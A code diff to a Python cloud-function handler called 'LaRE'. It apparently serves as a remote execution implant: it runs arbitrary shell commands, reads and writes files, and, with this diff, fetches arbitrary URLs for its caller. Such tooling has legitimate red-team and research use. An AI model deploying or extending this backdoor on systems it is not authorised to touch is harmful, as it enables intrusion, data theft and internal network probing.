@@ -2,29 +2,33 @@ import json
 import os
 import subprocess
 import base64
+import urllib3
 
-from .utils import *
+from utils import *
 
 
-def handler(event, context):
+def handler(event):
     print("[+] LaRE is starting")
 
     try:
-        action, data = parse_event(event)
-
+        action, data = parse_event(event.get_json())
         if action == CMD_OP:
-            status, output = run_cmd(data)
+            result, output = run_cmd(data)
+            resp_type = ResponseType.CMD
+
+        elif action == SPECIAL_OP:
+            result, output = run_special(data)
             resp_type = ResponseType.CMD
 
         elif action == GET_FILE_OP:
-            status, output = run_getfile(data)
+            result, output = run_getfile(data)
             resp_type = ResponseType.GETFILE
 
         elif action == PUT_FILE_OP:
-            status, output = run_putfile(data)
+            result, output = run_putfile(data)
             resp_type = ResponseType.PUTFILE
 
-        return construct_response(resp_type, status, output)
+        return construct_response(resp_type, result, output)
     except Exception as err:
         return construct_response(ResponseType.ERR, Status.EXCEPTION, err)
 
@@ -42,6 +46,8 @@ def parse_event(event):
             action = GET_FILE_OP
         elif body[OP] == PUT_FILE_OP:
             action = PUT_FILE_OP
+        elif body[OP] == SPECIAL_OP:
+            action = SPECIAL_OP
         else:
             raise Exception(f"[!] parse_event - Unknown operation {body[OP]}")
         return action, body[ARGS]
@@ -50,11 +56,26 @@ def parse_event(event):
 
 
 def run_cmd(cmd):
-    os.environ['PYTHONUNBUFFERED'] = True
+    os.environ['PYTHONUNBUFFERED'] = "1"
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     output, _ = proc.communicate()
     rc = proc.returncode
     return rc, output
+
+
+def run_special(cmd):
+    if cmd.startswith("curl"):
+        return curl(cmd) 
+
+
+def curl(cmd):
+    try:
+        addr = cmd.split(" ")[1]
+        http = urllib3.PoolManager()
+        response = http.request("GET", addr, timeout=1.5, retries=False)
+    except Exception as err:
+        raise Exception(f"[!] curl - Some error when using urllib3: {repr(err)}")
+    return Status.OK, response.data
 
 
 def run_getfile(path):
@@ -119,22 +140,23 @@ def run_putfile(args):
     return Status.OK, f"File successfully saved: {path}"
 
 
-def construct_response(resp_type, status, output):
+def construct_response(resp_type, result, output):
     if resp_type == ResponseType.CMD:
+        if result == 0:
+            result = Status.OK
+        else:
+            result = Status.ERR
         output = base64.b64encode(output).decode("utf-8")
     elif resp_type == ResponseType.GETFILE:
-        pass
-    elif resp_type == ResponseType.PUTFILE or ResponseType.ERR:
+        output = output.decode("utf-8")
+    elif resp_type == ResponseType.PUTFILE:
         output = base64.b64encode(output.encode("utf-8")).decode("utf-8")
+    elif resp_type == ResponseType.ERR:
+        output = base64.b64encode(str(output).encode("utf-8")).decode("utf-8")
 
-    response = {
-        "statusCode": 200,
-        "headers": {
-            "Content-Type": "application/json"
-        },
-        "body": json.dumps({
-            "status": status.value,
+    response = json.dumps({
+            "result": result.value,
             "output": output
         })
-    }
+    
     return response
